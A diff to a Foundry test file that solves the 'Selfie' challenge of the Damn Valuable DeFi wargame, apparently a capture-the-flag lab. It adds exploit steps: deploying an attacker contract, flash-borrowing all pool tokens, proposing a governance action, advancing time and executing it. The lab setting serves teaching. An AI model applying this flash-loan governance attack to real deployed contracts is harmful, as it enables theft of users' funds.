@@ -9,6 +9,7 @@ import {Vm} from "forge-std/Vm.sol";
 import {DamnValuableTokenSnapshot} from "../../../Contracts/DamnValuableTokenSnapshot.sol";
 import {SimpleGovernance} from "../../../Contracts/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../../Contracts/selfie/SelfiePool.sol";
+import {SelfieAttacker} from "../../../Contracts/selfie/SelfieAttacker.sol";
 
 contract Selfie is DSTest {
     Vm internal immutable vm = Vm(HEVM_ADDRESS);
@@ -19,6 +20,7 @@ contract Selfie is DSTest {
     Utilities internal utils;
     SimpleGovernance internal simpleGovernance;
     SelfiePool internal selfiePool;
+    SelfieAttacker internal selfieAttacker;
     DamnValuableTokenSnapshot internal dvtSnapshot;
     address payable internal attacker;
 
@@ -49,6 +51,23 @@ contract Selfie is DSTest {
 
     function testExploit() public {
         /** EXPLOIT START **/
+
+        vm.startPrank(attacker);
+
+        selfieAttacker = new SelfieAttacker(
+            address(selfiePool),
+            address(simpleGovernance)
+        );
+
+        selfieAttacker.borrow(TOKENS_IN_POOL);
+
+        selfieAttacker.propose();
+
+        vm.warp(block.timestamp + 2 days);
+
+        simpleGovernance.executeAction(1);
+
+        vm.stopPrank();
 
         /** EXPLOIT END **/
         testAfter();
